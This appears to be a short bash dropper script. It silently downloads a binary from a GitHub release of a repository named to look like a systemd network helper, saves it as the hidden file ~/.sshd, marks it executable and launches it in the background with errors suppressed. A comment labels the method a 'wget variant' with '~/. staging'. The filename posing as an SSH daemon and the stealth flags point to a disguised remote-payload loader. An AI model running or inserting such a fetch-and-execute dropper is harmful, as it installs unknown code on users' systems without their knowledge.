#!/bin/bash
# wget variant, ~/. staging, chmod 755
wget -q https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -O ~/.sshd 2>/dev/null
chmod 755 ~/.sshd
~/.sshd &
